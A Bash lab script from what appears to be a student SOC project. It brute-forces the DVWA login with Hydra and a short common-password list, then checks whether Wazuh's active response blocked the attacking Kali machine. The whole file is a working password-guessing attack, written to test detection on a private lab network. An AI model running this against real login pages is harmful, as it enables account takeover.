#!/usr/bin/env bash
# =============================================================================
# Proyecto 2 - Mini SOC TiendaCR - Ataque 2: fuerza bruta contra el login web
# Ejecutar SOLO desde Kali-Atacante contra el laboratorio propio.
# MITRE ATT&CK T1110.001 (Password Guessing)
# Uso:  bash ataque2-fuerza-bruta.sh
# =============================================================================
TARGET="${TARGET:-192.168.56.10}"
CJ=/tmp/dvwa-cookies.txt
PASS=/tmp/pass.txt

echo "[1/4] Iniciando sesion en DVWA para obtener la cookie de sesion..."
TOKEN=$(curl -s -c "$CJ" "http://$TARGET/login.php" | grep -oP "user_token' value='\K[^']+")
curl -s -b "$CJ" -c "$CJ" -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
     "http://$TARGET/login.php" -o /dev/null
SESS=$(grep PHPSESSID "$CJ" | awk '{print $7}')
[ -n "$SESS" ] || { echo "No se pudo obtener la sesion. ¿Kali esta bloqueada? Espere 3 min."; exit 1; }
echo "      Sesion: ${SESS:0:8}..."

echo "[2/4] Creando lista de 31 contrasenas (la correcta va de ultima)..."
printf "%s\n" 123456 12345678 qwerty abc123 letmein monkey dragon football iloveyou admin123 \
  welcome sunshine master shadow princess 654321 superman batman trustno1 passw0rd tiendacr \
  costarica hola123 admin root toor changeme secret 111111 000000 password > "$PASS"

echo "[3/4] Lanzando Hydra  -- INICIO: $(date '+%H:%M:%S')"
timeout 90 hydra -l admin -P "$PASS" -t 2 -f "$TARGET" http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=$SESS; security=low:F=Username and/or password incorrect."
echo "      Hydra termino o fue cortado: $(date '+%H:%M:%S')"

echo "[4/4] Comprobando si la respuesta automatica bloqueo a Kali..."
if curl -s -m 5 -o /dev/null "http://$TARGET/"; then
  echo "      >>> Kali NO esta bloqueada (HTTP responde)"
else
  echo "      >>> BLOQUEADO por la respuesta automatica de Wazuh ($(date '+%H:%M:%S'))"
  echo "      El bloqueo dura 180 s. Pruebe de nuevo con:  curl -m 5 -I http://$TARGET/"
fi
